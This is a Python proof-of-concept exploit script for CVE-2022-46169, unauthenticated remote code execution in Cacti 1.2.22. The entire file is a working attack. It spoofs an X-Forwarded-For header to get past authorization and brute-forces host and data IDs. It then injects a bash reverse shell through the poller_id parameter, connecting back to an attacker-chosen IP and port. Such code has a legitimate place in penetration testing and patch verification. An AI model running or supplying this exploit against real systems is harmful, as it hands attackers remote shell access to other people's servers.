import argparse
import requests
import urllib.parse

def check_vulnerability(url, header):
    res = requests.get(f"{url}/remote_agent.php", headers=header)
    return (res.text != "FATAL: You are not authorized to use this service" and res.status_code == 200)


def brute_force_ids(url, header):
    for i in range(1, 5):
        for j in range(1, 10):
            vuln_id_url = f"{url}/remote_agent.php?action=polldata&poller_id=1&host_id={i}&local_data_ids[]={j}"
            res = requests.get(vuln_id_url, headers=header)

            if res.text != "[]":
                rrd_name = res.json()[0]["rrd_name"]
                if rrd_name in ("polling_time", "uptime"):
                    return True, i, j

    return False, -1, -1


def rce(url, header, payload, host_id, local_id):
    encoded_payload = urllib.parse.quote(payload)
    injected_url = f"{url}/remote_agent.php?action=polldata&poller_id=;{encoded_payload}&host_id={host_id}&local_data_ids[]={local_id}"

    res = requests.get(injected_url, headers=header)
    print(res.text)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--ip", required=True, help="IP address to receive reverse shell")
    parser.add_argument("--port", required=True, help="Port to receive reverse shell")
    args = parser.parse_args()

    header = {"X-Forwarded-For": "127.0.0.1"}
    print("""
    | ---------------------------------------------------- |
    | CVE-2022-46169 | Unauthenticated RCE in Cacti 1.2.22 |
    |                  PoC by lukka7sec                    |
    | ---------------------------------------------------- |
    """)
    print("[-] Checking vulnerability...")
    if check_vulnerability(args.url, header):
        print("[-] Cacti application is VULNERABLE")
        is_vuln, host_id, local_id = brute_force_ids(args.url, header)
        payload = f"bash -c 'bash -i >& /dev/tcp/{args.ip}/{args.port} 0>&1'"
        if is_vuln:
            print("[-] Executing reverse shell...")
            rce(args.url, header, payload, host_id, local_id)
        else:
            print("[!] RRD not found")
    else:
        print("[!] Cacti application is not vulnerable")

